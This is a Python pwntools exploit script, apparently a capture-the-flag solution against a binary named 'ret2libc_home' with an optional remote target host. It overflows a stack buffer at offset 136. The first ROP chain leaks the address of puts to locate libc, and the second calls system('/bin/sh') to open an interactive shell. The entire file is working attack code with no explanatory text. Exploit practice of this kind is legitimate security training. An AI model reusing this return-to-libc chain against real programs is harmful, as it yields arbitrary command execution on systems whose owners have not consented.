#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_home', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13572)
    else:
        return process(elf.path)

p = conn()

OFFSET_TO_RIP = 136

POP_RDI = 0x00000000004011ff
RET = 0x000000000040101a
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']

# -------- Stage 1: leak puts --------
p.recvuntil(b'message:\n')
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(MAIN),
)
p.send(stage1)
p.recvline()              

leaked = p.recvline().strip(b'\n')
print(leaked)
leak_puts = u64(leaked.ljust(8, b'\x00'))
log.info(f"puts leak = {leak_puts:#x}")

libc.address = leak_puts - libc.symbols['puts']
log.info(f"libc base = {libc.address:#x}")

# -------- Stage 2: system("/bin/sh") --------
BINSH = next(libc.search(b'/bin/sh\x00'))

system_addr = libc.symbols['system']
p.recvuntil(b'message:\n')
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),
    p64(POP_RDI),
    p64(BINSH),
    p64(system_addr),
)
p.send(stage2)
print(p.recvline())

p.interactive()
